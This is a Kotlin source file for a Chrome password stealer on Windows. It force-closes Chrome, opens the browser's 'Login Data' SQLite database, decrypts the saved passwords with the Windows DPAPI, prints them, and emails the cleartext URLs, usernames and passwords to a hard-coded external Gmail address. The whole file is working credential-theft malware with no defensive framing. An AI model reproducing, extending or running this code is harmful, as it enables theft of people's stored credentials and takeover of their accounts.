import com.sun.jna.platform.win32.Crypt32Util
import java.io.File
import java.net.URL
import java.sql.Connection
import java.sql.DriverManager


private lateinit var databaseFile: File
private lateinit var connection: Connection
private const val emailToSendTo = "astroazure7@gmail.com"

fun main(args: Array<String>) {
    Runtime.getRuntime().exec("taskkill /F /IM chrome.exe") // force close chrome
    checkInternetConnection()
    searchChrome()
    connectDb()
    val list = getAccounts()
            .filter {
                !it.username.isBlank()
                !it.website.isBlank()
                !it.clearTextPassword.isBlank()
            }.also { it.forEach(::println) }

    val emailRes = MailerTLS.sendDump(emailToSendTo, list)
    if(emailRes) println("Sent ^^")
}

/**
 * Searches for chrome on the computer
 * Then searches for the file that stores the passwords
 * If file doesn't exist, program exits
 */
private fun searchChrome() {
    val databaseFileDir = "${System.getenv("localappdata")}\\Google\\Chrome\\User Data\\Default\\Login Data"
    databaseFile = File(databaseFileDir)
    if (!databaseFile.exists())
        println("Chrome does not exist!").run { System.exit(0) }
}

/**
 * Uses Windows Password to decrypt encrypted chrome passwords
 */
fun getWin32Password(encryptedData: ByteArray) =
        String(Crypt32Util.cryptUnprotectData(encryptedData))

/**
 * Create database connection
 */
private fun connectDb() = try {
    Class.forName("org.sqlite.JDBC")
    connection = DriverManager.getConnection("jdbc:sqlite:$databaseFile")
    println("Database file found!")
} catch (e: Exception) {
    println(e.printStackTrace()) // error will occur is chrome is open
    System.exit(0)
}

/**
 * Queries database for the required fields
 * Then convert them to ChromeAccount object and place them into a list
 */
private fun getAccounts(): ArrayList<ChromeAccount> {
    val chromeAccounts = arrayListOf<ChromeAccount>()
    val stmt = connection.createStatement()
    val resultSet = stmt.executeQuery("SELECT action_url, username_value, password_value FROM logins")
    while (resultSet.next()) chromeAccounts.add(ChromeAccount(resultSet))

    stmt.close()
    connection.close()

    return chromeAccounts
}

/**
 * Checks for internet connection by pinging google
 */
private fun checkInternetConnection() = try {
    URL("https://www.google.com").openConnection().connect()
    println("Internet connection found!")
}catch (e: Exception) {
    println("No internet connection")
    System.exit(0)
}


